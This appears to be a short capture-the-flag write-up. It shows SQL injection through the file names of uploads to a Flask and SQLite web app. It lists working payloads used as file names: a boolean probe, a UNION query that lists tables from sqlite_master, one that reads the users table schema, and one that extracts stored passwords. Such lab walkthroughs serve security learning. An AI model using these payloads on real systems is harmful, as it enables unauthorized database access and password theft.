(note: use the basta.js instead of renaming and uploading files. use the setPayload method to name ur file.)

1. since it uses flask and sqlite, test if it can be used with sqlite injection. by making a file 
* **file name:**
    ```
    ' AND '1'='1.jpg
    ```` 

- if it doesnt say "already exist" when uploaded again. which means it can be used with SQL injection

2. since its sqlite lets use sqlite syntax:
* **show tables:**
    ```
    ' UNION SELECT name FROM sqlite_master WHERE type='table'--.jpg
    ````
3. we got files table. ACTUALLY ITS USELESS JAKJABKABVKBAG. we actually need to look for the hidden users table!!. im gonna cry ;-;.
* **show table `users` data:**
    ```
    ' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='users'--.jpg
    ```
4. it shows that it has username and password
* **lets get the `password`:**
    ```
    ' UNION SELECT password FROM users LIMIT 1 OFFSET 0 -- .png
    ```